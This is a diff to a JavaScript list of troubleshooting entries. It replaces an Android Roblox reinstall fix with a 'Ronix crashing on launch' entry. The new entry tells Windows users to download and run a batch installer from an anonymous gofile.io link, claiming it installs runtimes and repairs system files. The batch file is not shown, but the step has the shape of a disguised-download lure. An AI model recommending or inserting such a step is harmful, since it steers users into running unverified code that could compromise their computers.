@@ -820,20 +820,24 @@ let fixes = [
     code: null,
     video: 'https://www.youtube.com/embed/lMPS0LO8AZ0'
   },
-  {
-    id:2, os:'android', trending:true,
-    title:'Roblox Stuck on Loading Screen — Reinstall Loop',
-    desc:'Game gets stuck at 50% loading and never finishes. Reinstalling doesn\'t help by itself.',
-    tags:['loading','install','android'],
-    views:980, helpful:67, date:'3 days ago',
-    steps:[
-      {text:'Uninstall Roblox from your device completely.'},
-      {text:'Go to Settings → Storage and clear Google Play Store cache.'},
-      {text:'Reboot the device.'},
-      {text:'Reinstall Roblox. If on mobile data, switch to Wi-Fi first.'},
-      {text:'Open Roblox while connected to Wi-Fi and let it fully load assets on first launch.'},
-    ],
-    code:null
+       {
+        id: 2, os: 'windows', trending: true,
+        title: 'Ronix crashing on launch/not working',
+        desc: 'Ronix fails to open or crashes immediately due to missing system dependencies.',
+        tags: ['crash', 'install', 'windows'],
+        views: 980, helpful: 67, date: '3 days ago',
+        steps: [
+          { text: '1. The Following Installer(bat) will install the following things, Also The second installer will repair your system files if they are corrupted' },
+          { text: '2. Install .NET Runtime 8.0' },
+          { text: '3. Install Microsoft Visual C++ Redistributable (x64 & x86)' },
+          { text: '4. Install Microsoft Edge WebView2 Runtime' },
+          { text: '5. Install DirectX End-User Runtime' },
+          { text: '6. Install .NET Framework 4.8' },
+          { text: '7. Restart your PC' },
+          { text: '8. Launch Ronix again' },
+          { text: '<strong>Note:</strong> You can get the installer from <a href="https://gofile.io/d/TBujQE" target="_blank"><strong>HERE</strong></a>' },
+        ],
+        code: null
   },
   {
     id:3, os:'windows', trending:true,
